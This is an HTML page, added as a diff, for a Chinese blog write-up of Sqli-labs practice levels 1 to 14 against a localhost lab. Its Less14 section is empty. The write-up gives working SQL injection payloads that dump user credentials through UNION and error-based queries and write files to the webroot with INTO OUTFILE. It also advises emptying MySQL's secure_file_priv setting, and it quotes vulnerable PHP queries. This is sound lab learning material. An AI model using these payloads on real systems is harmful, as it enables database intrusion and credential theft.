@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFIL">
+<meta name="keywords" content="Web安全,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqli-labs Less1-20">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFIL">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/10.png">
+<meta property="og:updated_time" content="2019-04-21T12:37:45.727Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqli-labs Less1-20">
+<meta name="twitter:description" content="0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFIL">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Sqli-labs Less1-20</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/01/28/IA-32寄存器/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/01/01/PHP反序列化漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&text=Sqli-labs Less1-20"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&is_video=false&description=Sqli-labs Less1-20"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqli-labs Less1-20&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&name=Sqli-labs Less1-20&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Less1-Less10"><span class="toc-number">1.</span> <span class="toc-text">0x01 Less1-Less10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Less11"><span class="toc-number">2.</span> <span class="toc-text">0x02 Less11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Less12"><span class="toc-number">3.</span> <span class="toc-text">0x03 Less12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Less13"><span class="toc-number">4.</span> <span class="toc-text">0x04 Less13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Less14"><span class="toc-number">5.</span> <span class="toc-text">0x05 Less14</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Sqli-labs Less1-20
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-01-01T14:43:28.000Z" itemprop="datePublished">2019-01-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Web安全基础/">Web安全基础</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL注入/">SQL注入</a>, <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-Less1-Less10"><a href="#0x01-Less1-Less10" class="headerlink" title="0x01 Less1-Less10"></a>0x01 Less1-Less10</h2><p>参考旧博客文章<a href="https://blog.csdn.net/ski_12/article/details/70168346" target="_blank" rel="noopener">《Sqli-labs之Less1-10》</a>，个人觉得写得还算详细。</p>
+<p>下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#To avoid warning messages</span></span><br><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">"E:/wamp64/tmp"</span></span><br></pre></td></tr></table></figure>
+<p>解决办法直接将其置空即可。</p>
+<p>再发一次payload，就能在当前目录访问生成的文件了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=0&apos;)) union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users into outfile &quot;E:\\wamp64\\www\\sqli\\Less-7\\7.txt&quot; %23</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/01/01/Sqli-labs-writeup/1.png" alt=""></p>
+<h2 id="0x02-Less11"><a href="#0x02-Less11" class="headerlink" title="0x02 Less11"></a>0x02 Less11</h2><p>打开是个登录界面，可以输入用户名和密码，尝试输入admin’：</p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/2.png" alt=""></p>
+<p>可以看到页面直接返回显示报错信息：’666’ LIMIT 0,1’</p>
+<p>再在password中尝试注入：</p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/3.png" alt=""></p>
+<p>显示报错信息：’’666’’ LIMIT 0,1’</p>
+<p>由此推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=’admin’ and password=’666’ LIMIT 0,1;</p>
+<p>验证一下，这里用’ and 1=1#和’ and 1=2#来组合验证是行不通的，因为这并非和前面的level一样只有一个入参，而且这里我们本来就不知道正确的用户名和密码，因此后面再加and是无法判断的，那就直接用or：</p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/4.png" alt=""></p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/5.png" alt=""></p>
+<p>没毛病，直接上payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=666&apos; union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>最后看下源码的SQL语句，确实和推测的差不多：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Less12"><a href="#0x03-Less12" class="headerlink" title="0x03 Less12"></a>0x03 Less12</h2><p>和level11一样的登录界面，在用户名处输入双引号后出现如下报错信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;666&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=(“admin”) and password=(“666”) LIMIT 0,1;</p>
+<p>输入uname=admin”)&amp;passwd=666&amp;submit=Submit看到该报错信息即可验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;) and password=(&quot;666&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=666&quot;) union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>看下SQL语句源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// connectivity</span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line"><span class="meta">@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Less13"><a href="#0x04-Less13" class="headerlink" title="0x04 Less13"></a>0x04 Less13</h2><p>和level12一样，只是双引号换成了单引号，查询失败返回显示错误信息，但查询成功不返回显示任何字段内容。</p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/7.png" alt=""></p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/8.png" alt=""></p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/9.png" alt=""></p>
+<p>由此可知，是，利用和level5类似，利用基于错误的SQL语句，如下面利用报错显示出数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) union select 1,2 from(select count(*),concat_ws(char(32,58,32),database(),floor(rand()*2))name from information_schema.tables group by name)b#</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/01/01/Sqli-labs-writeup/6.png" alt=""></p>
+<p>直接上payload，其中若不使用group_concat则只要改下limit 0,1的第一个参数即可遍历所有变量：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">name</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span>)b<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="string">') union select 1,2 from(select count(*),concat(char(32,58,32),(select group_concat(column_name) from information_schema.columns where table_schema='</span><span class="keyword">security</span><span class="string">' and table_name='</span><span class="keyword">users</span><span class="string">'),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">name</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span>)b<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/01/01/Sqli-labs-writeup/10.png" alt=""></p>
+<p>看下源码，注释掉了显示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/ connectivity </span><br><span class="line">	@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo '&lt;font color= "#0000ff"&gt;';	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line">		<span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line">		<span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">		<span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line">		<span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Less14"><a href="#0x05-Less14" class="headerlink" title="0x05 Less14"></a>0x05 Less14</h2>
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Less1-Less10"><span class="toc-number">1.</span> <span class="toc-text">0x01 Less1-Less10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Less11"><span class="toc-number">2.</span> <span class="toc-text">0x02 Less11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Less12"><span class="toc-number">3.</span> <span class="toc-text">0x03 Less12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Less13"><span class="toc-number">4.</span> <span class="toc-text">0x04 Less13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Less14"><span class="toc-number">5.</span> <span class="toc-text">0x05 Less14</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&text=Sqli-labs Less1-20"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&is_video=false&description=Sqli-labs Less1-20"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqli-labs Less1-20&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&title=Sqli-labs Less1-20"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/&name=Sqli-labs Less1-20&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
